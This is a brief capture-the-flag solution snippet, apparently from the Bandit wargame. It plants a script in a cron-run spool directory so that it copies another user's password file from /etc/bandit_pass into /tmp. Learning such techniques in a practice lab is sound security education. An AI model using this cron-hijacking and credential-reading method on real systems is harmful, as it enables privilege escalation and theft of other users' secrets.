# Make a shell script in /var/spool/bandit24/foo that is 'cat etc/bandit_pass/bandit24'
vim /var/spool/bandit24/foo/whoa.sh

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/whoa.txt

chmod 777 /var/spool/bandit24/foo/whoa.sh
